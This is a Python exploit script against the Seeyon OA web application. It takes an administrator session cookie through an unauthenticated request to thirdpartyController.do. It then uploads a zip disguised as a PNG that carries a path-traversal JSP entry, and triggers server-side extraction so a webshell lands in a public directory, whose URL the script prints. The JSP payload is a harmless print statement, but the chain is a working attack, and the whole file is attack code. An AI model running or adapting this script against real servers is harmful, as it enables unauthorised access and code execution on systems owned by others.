#! python3
"""
@FileName: seeyon_getcookie_upload_zip.py
@Author: dylan
@software: PyCharm
@Datetime: 2021-04-10 20:30
"""
import zipfile
from urllib.parse import urljoin
import requests
import re
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68"
}
shell_name = 'test.jsp'
shell_name_zip = '../' + shell_name
zip_file_name = "shell.zip"
shell_content = r'<%out.println("Hello The World!");%>'

def make_zip_file():
    zf = zipfile.ZipFile(zip_file_name, mode='a', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(shell_name_zip, shell_content)


def get_cookie(url):
    targetURl = urljoin(url, '/seeyon/thirdpartyController.do')
    data = {
        "method": "access",
        "enc": "TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4",
        "clientPath": "127.0.0.1"
    }

    response = requests.post(url=targetURl, headers=headers, data=data, timeout=60, verify=False)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookie = requests.utils.dict_from_cookiejar(cookie)
        cookie = cookie['JSESSIONID']
        print("[+] The administrator cookie:", cookie)
        return cookie
    else:
        print("[-] Failed to get administrator cookie！")
        return None


def uploadFile(orgurl, cookie):
    targeturl = orgurl.rstrip('/') + '/seeyon/fileUpload.do?method=processUpload'
    files = [('file1', ('file.png', open(zip_file_name, 'rb'), 'image/png'))]
    headers["Cookie"] = "JSESSIONID=" + cookie
    data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0', 'isEncrypt': "0"}
    response = requests.post(url=targeturl, files=files, data=data, headers=headers, timeout=60, verify=False)
    if response.text:
        reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'', response.text, re.I)
        if len(reg) == 0:
            print("[-] fileurls match failed！")
            return None
        fileid = reg[0]
        return fileid


def unzipFile(target, fileid, cookie):
    target = urljoin(target, '/seeyon/ajax.do')
    datestr = time.strftime('%Y-%m-%d')
    data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + fileid + '%22%5D'
    headers["Cookie"] = "JSESSIONID=" + cookie
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    response = requests.post(target, data=data, headers=headers, timeout=60, verify=False)
    shell_url = urljoin(target, '/seeyon/common/designer/pageLayout/' + shell_name)
    if response.status_code == 500 and ("Error on" in response.text):
        print("[+] File Uploaded Successfully！")
        print("[+] Webshell:", shell_url)
    else:
        print("[-] Failed to unzip file！")


if __name__ == '__main__':
    url = "http://x.x.x.x/"

    try:
        cookies = get_cookie(url)
        if cookies:
            make_zip_file()
            fileID = uploadFile(url, cookies)
            if fileID:
                unzipFile(url, fileID, cookies)
    except Exception as e:
        print(str(e))
